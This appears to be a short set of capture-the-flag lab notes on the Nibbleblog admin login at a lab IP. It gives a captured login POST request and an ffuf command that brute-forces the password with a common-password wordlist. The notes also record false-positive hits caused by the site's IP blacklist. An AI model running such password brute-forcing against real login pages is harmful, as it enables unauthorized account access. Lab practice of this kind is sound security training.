`/nibbleblog/admin.php`

requets 
```
POST /nibbleblog/admin.php HTTP/1.1
Host: 10.10.10.75
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://10.10.10.75
Connection: close
Referer: http://10.10.10.75/nibbleblog/admin.php
Cookie: PHPSESSID=2e4lqk1ejb1cbtpeeh9h31t5g2
Upgrade-Insecure-Requests: 1

username=admin&password=password
```


# ffuf
```
$ ffuf -request ./login-req.txt -request-proto http -w /usr/share/wordlists/seclists/SecLists-master/Passwords/xato-net-10-million-passwords-10000.txt -fs 1541
```

```
football                [Status: 200, Size: 48, Words: 6, Lines: 1, Duration: 307ms]
baseball                [Status: 200, Size: 48, Words: 6, Lines: 1, Duration: 307ms]
dragon                  [Status: 200, Size: 48, Words: 6, Lines: 1, Duration: 307ms]
696969                  [Status: 200, Size: 48, Words: 6, Lines: 1, Duration: 307ms]
abc123                  [Status: 200, Size: 48, Words: 6, Lines: 1, Duration: 307ms]
1234567                 [Status: 200, Size: 48, Words: 6, Lines: 1, Duration: 307ms]
```
response size 48
response is coming back as `Nibbleblog security - blacklist protection`
website seems to have some ip rate-limiting protection implemented

